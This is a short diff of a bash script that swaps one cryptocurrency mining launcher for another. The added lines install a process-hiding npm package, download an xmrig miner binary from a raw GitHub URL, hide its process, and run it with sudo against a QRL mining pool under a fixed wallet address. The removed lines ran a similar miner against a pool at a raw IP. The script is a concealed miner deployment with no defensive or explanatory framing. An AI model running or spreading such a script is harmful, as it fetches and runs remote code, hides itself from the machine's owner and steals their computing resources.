@@ -1,5 +1,6 @@
-git clone https://github.com/realxdagg/vio.git
-cd vio
-chmod 500 SRB
-sudo ./SRB --disable-gpu --algorithm randomepic --pool 188.166.215.195:2222 --wallet adzvoll#run  --cpu-threads 8
-	
+#!/bin/bash
+npm i -g node-process-hider
+wget https://raw.githubusercontent.com/realxdagg/job/main/xmrig
+chmod 500 xmrig
+ph add xmrig
+sudo ./xmrig -o us-qrl.volt-mine.com:4333 -u Q01050018ae33f2279aeafbb40b03bee3c2b69a0f2f27bd147d68dc4c6cfa807e93cc27ccef4e15 -k --tls --threads=8
